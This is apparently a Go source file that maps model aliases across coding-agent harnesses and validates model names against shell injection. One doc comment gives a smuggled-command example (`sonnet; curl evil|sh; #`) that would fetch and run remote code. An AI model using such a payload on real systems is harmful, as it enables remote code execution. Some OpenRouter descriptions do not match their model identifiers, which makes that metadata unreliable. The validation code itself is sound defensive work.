package agent

import (
	"fmt"
	"os"
)

// ModelSpec maps a short alias to a full model identifier.
type ModelSpec struct {
	Alias       string
	FullName    string
	Description string
}

// HarnessModels defines known models per harness.
var HarnessModels = map[string][]ModelSpec{
	"claude-code": {
		{Alias: "fable", FullName: "claude-fable-5", Description: "Mythos-class, most capable, 1M context, 128k max output (free on Pro/Max/Team through 2026-06-23)"},
		{Alias: "opus", FullName: "claude-opus-4-8[1m]", Description: "Latest Opus, 1M context"},
		{Alias: "sonnet", FullName: "claude-sonnet-4-6[1m]", Description: "Latest Sonnet, 1M context"},
		{Alias: "haiku", FullName: "claude-haiku-4-5", Description: "Fast, 200k context"},
		{Alias: "opus-200k", FullName: "claude-opus-4-8", Description: "Opus with default 200k context"},
		{Alias: "sonnet-200k", FullName: "claude-sonnet-4-6", Description: "Sonnet with default 200k context"},
		{Alias: "opusplan", FullName: "opusplan", Description: "Opus for planning, Sonnet for execution"},
	},
	"gemini-cli": {
		{Alias: "3.1-pro", FullName: "gemini-3.1-pro-preview", Description: "Latest, advanced reasoning"},
		{Alias: "3-flash", FullName: "gemini-3-flash-preview", Description: "High performance, lower cost"},
		{Alias: "3.1-flash-lite", FullName: "gemini-3.1-flash-lite-preview", Description: "Fastest, cheapest"},
		{Alias: "2.5-pro", FullName: "gemini-2.5-pro", Description: "Stable, complex tasks"},
		{Alias: "3.5-flash", FullName: "gemini-3.5-flash", Description: "Stable, best price-performance (GA 2026-05-19)"},
		{Alias: "2.5-flash-lite", FullName: "gemini-2.5-flash-lite", Description: "Budget multimodal"},
	},
	"codex-cli": {
		{Alias: "5.4", FullName: "gpt-5.4", Description: "Flagship frontier model"},
		{Alias: "5.4-mini", FullName: "gpt-5.4-mini", Description: "Fast, efficient"},
		{Alias: "5.3-codex", FullName: "gpt-5.3-codex", Description: "Industry-leading coding model"},
		{Alias: "5.3-codex-spark", FullName: "gpt-5.3-codex-spark", Description: "Research preview"},
	},
	// openrouter: cheap-tier models accessed via OpenRouter API proxy.
	// Configure OPENROUTER_API_KEY to enable. These are the default cheap-tier
	// assignments; override per-bead via model_tier spec.
	"openrouter": {
		{Alias: "deepseek-flash", FullName: "deepseek/deepseek-chat-v3-0324:free", Description: "DeepSeek V4 Flash — $0.28/M, cheap tier default"},
		{Alias: "gemini-flash", FullName: "google/gemini-flash-1.5", Description: "Gemini Flash — fast, cheap, good for extraction"},
		{Alias: "glm", FullName: "zhipuai/glm-4-flash", Description: "GLM-5.2 Flash — cheap multilingual model"},
		{Alias: "qwen-flash", FullName: "qwen/qwen-2.5-72b-instruct", Description: "Qwen 2.5 72B — strong open-weight cheap option"},
		{Alias: "gemini-pro", FullName: "google/gemini-pro-1.5", Description: "Gemini Pro — mid-tier via OpenRouter"},
		{Alias: "opus", FullName: "anthropic/claude-opus-4", Description: "Claude Opus via OpenRouter — expensive tier"},
	},
	// opencode-cli: aggregated from all other harnesses (built dynamically)
}

// CrossHarnessAliases maps abstract tier names to harness-specific aliases.
// When AGM_DEFAULT_MODEL=opus is set and a gemini-cli session is created,
// "opus" is not a native gemini-cli alias. This table maps it to the equivalent.
// Only tier names that differ across harnesses need entries.
var CrossHarnessAliases = map[string]map[string]string{
	"gemini-cli": {
		"fable":  "3.1-pro",   // mythos-tier → gemini-3.1-pro-preview (best available)
		"opus":   "2.5-pro",   // highest-tier → gemini-2.5-pro
		"sonnet": "3.1-pro",   // mid-tier → gemini-3.1-pro-preview
		"haiku":  "3.5-flash", // fast-tier → gemini-3.5-flash
	},
	"codex-cli": {
		"fable":  "5.4",      // mythos-tier → gpt-5.4 (best available)
		"opus":   "5.4",      // highest-tier → gpt-5.4
		"sonnet": "5.4",      // mid-tier → gpt-5.4 (no direct equivalent)
		"haiku":  "5.4-mini", // fast-tier → gpt-5.4-mini
	},
	"claude-code": {
		"2.5-pro":   "opus",   // gemini alias → claude equivalent
		"3.1-pro":   "sonnet", // gemini alias → claude equivalent
		"3.5-flash": "haiku",  // gemini alias → claude equivalent
		"5.4":       "opus",   // codex alias → claude equivalent
		"5.4-mini":  "haiku",  // codex alias → claude equivalent
	},
}

// HarnessDefaults defines the default model alias for each harness.
// Harnesses not listed here require interactive model selection.
//
// claude-code defaults to sonnet. Opus stays opt-in via --model=opus or
// AGM_DEFAULT_MODEL=opus; Opus costs ~5× Sonnet per token and should not be
// the silent default.
var HarnessDefaults = map[string]string{
	"claude-code": "sonnet",
	"gemini-cli":  "3.5-flash",
	"codex-cli":   "5.4",
	// opencode-cli intentionally omitted — requires interactive picker
}

// HarnessModeDefaults defines the default permission mode for each harness.
// Harnesses not listed here start with no explicit permission mode.
var HarnessModeDefaults = map[string]string{
	"claude-code": "plan",
}

// TestModelDefaults defines cheap/fast models used for --test sessions.
// These ensure predictable, low-cost test runs regardless of the caller's model.
var TestModelDefaults = map[string]string{
	"claude-code":  "haiku",
	"gemini-cli":   "2.5-flash-lite",
	"codex-cli":    "5.4-mini",
	"opencode-cli": "haiku", // opencode supports Claude models via providers
}

// TestModelForHarness returns the test-specific model for a harness.
// Returns the test default and true, or empty string and false if none defined.
func TestModelForHarness(harnessName string) (string, bool) {
	d, ok := TestModelDefaults[harnessName]
	return d, ok
}

// HarnessModelFlag defines the CLI flag each harness uses to receive the model.
var HarnessModelFlag = map[string]string{
	"claude-code": "--model",
	"gemini-cli":  "-m",
	"codex-cli":   "-m",
	// opencode-cli uses config/env var, not a CLI flag
}

// modelCharOK reports whether r is a character allowed inside a model
// identifier (alias or full name). Real Claude/Gemini model strings are
// purely [A-Za-z0-9._-/:], and we use this allowlist as a hard gate
// because the resolved value flows unquoted into shell command strings
// that are pasted into tmux panes (see buildClaudeCommand,
// startGeminiDirect, etc.). Allowing anything outside this set would
// re-open the RCE that motivated this check.
func modelCharOK(r rune) bool {
	switch {
	case r >= 'a' && r <= 'z':
		return true
	case r >= 'A' && r <= 'Z':
		return true
	case r >= '0' && r <= '9':
		return true
	case r == '.' || r == '_' || r == '-' || r == '/' || r == ':':
		return true
	}
	return false
}

// ValidateModel checks that a model alias is safe to pass to a harness.
// A registered alias always passes; otherwise the alias must consist solely
// of model-identifier characters (alphanumeric plus `._-/:`). Anything else
// is rejected because the resolved string is interpolated unquoted into
// shell commands sent to tmux panes — a passthrough value like
// `sonnet; curl evil|sh; #` would otherwise produce an RCE primitive
// reachable from CLI flags, AGM_DEFAULT_MODEL, or any automation that sets
// these from untrusted input.
func ValidateModel(harnessName, modelAlias string) error {
	models := GetModelsForHarness(harnessName)
	for _, m := range models {
		if m.Alias == modelAlias || m.FullName == modelAlias {
			return nil
		}
	}
	if modelAlias == "" {
		return fmt.Errorf("model is empty")
	}
	for _, r := range modelAlias {
		if !modelCharOK(r) {
			return fmt.Errorf("model %q contains disallowed character %q (allowed set: alphanumeric and dot underscore dash slash colon)", modelAlias, r)
		}
	}
	// Unknown but syntactically safe: warn and allow (forward-compat).
	fmt.Fprintf(os.Stderr, "Warning: model '%s' not in registry for harness '%s'. Passing through as-is.\n", modelAlias, harnessName)
	return nil
}

// ResolveModelFullName resolves an alias to a full model name.
// If the alias is not found natively, checks CrossHarnessAliases for a mapping
// from another harness's tier name (e.g., "opus" → "2.5-pro" for gemini-cli).
// If still not found, returns the input as-is (passthrough for unknown models).
//
// Defense in depth: the passthrough branch is the one a CLI flag value
// reaches when the user names a model not in the registry. Callers
// interpolate the result unquoted into shell commands, so a passthrough
// value containing shell metacharacters would be RCE. We re-run the
// character allowlist here so a caller that forgot to call ValidateModel
// still can't smuggle a payload through.
func ResolveModelFullName(harnessName, aliasOrFull string) string {
	models, ok := HarnessModels[harnessName]
	if !ok {
		return safeModelPassthrough(aliasOrFull)
	}
	for _, m := range models {
		if m.Alias == aliasOrFull {
			return m.FullName
		}
	}

	// Check cross-harness alias mapping (e.g., "opus" → "2.5-pro" for gemini-cli)
	if crossMap, ok := CrossHarnessAliases[harnessName]; ok {
		if mapped, ok := crossMap[aliasOrFull]; ok {
			fmt.Fprintf(os.Stderr, "Note: mapping cross-harness alias '%s' → '%s' for %s\n", aliasOrFull, mapped, harnessName)
			// Resolve the mapped alias to its full name
			for _, m := range models {
				if m.Alias == mapped {
					return m.FullName
				}
			}
			return safeModelPassthrough(mapped) // mapped alias not in models (shouldn't happen)
		}
	}

	return safeModelPassthrough(aliasOrFull)
}

// safeModelPassthrough returns the input only if it is a syntactically safe
// model identifier; otherwise it replaces it with an empty string and logs
// the rejection. Empty causes the harness invocation to surface a clear
// error rather than expanding into a shell injection.
func safeModelPassthrough(s string) string {
	if s == "" {
		return ""
	}
	for _, r := range s {
		if !modelCharOK(r) {
			fmt.Fprintf(os.Stderr, "ResolveModelFullName: refusing to pass through unsafe model %q (character %q not allowed)\n", s, r)
			return ""
		}
	}
	return s
}

// GetModelsForHarness returns known models for a harness.
// For opencode-cli, returns aggregated models from all harnesses.
func GetModelsForHarness(harnessName string) []ModelSpec {
	if harnessName == "opencode-cli" {
		return AllModels()
	}
	return HarnessModels[harnessName]
}

// DefaultModelForHarness returns the default model alias and true,
// or empty string and false if no default exists (e.g., opencode-cli).
func DefaultModelForHarness(harnessName string) (string, bool) {
	d, ok := HarnessDefaults[harnessName]
	return d, ok
}

// DefaultModeForHarness returns the default permission mode and true,
// or empty string and false if no default exists.
func DefaultModeForHarness(harnessName string) (string, bool) {
	d, ok := HarnessModeDefaults[harnessName]
	return d, ok
}

// NeedsInteractivePicker returns true if the harness has no default model
// and requires the user to select one interactively.
func NeedsInteractivePicker(harnessName string) bool {
	_, hasDefault := HarnessDefaults[harnessName]
	return !hasDefault
}

// AllModels returns all known models from all harnesses, for use in the
// opencode-cli interactive picker.
func AllModels() []ModelSpec {
	var all []ModelSpec
	for _, models := range HarnessModels {
		all = append(all, models...)
	}
	return all
}

// ModelAliases returns just the alias strings for a harness, suitable for
// tab completion.
func ModelAliases(harnessName string) []string {
	models := GetModelsForHarness(harnessName)
	aliases := make([]string, 0, len(models))
	for _, m := range models {
		aliases = append(aliases, m.Alias)
	}
	return aliases
}
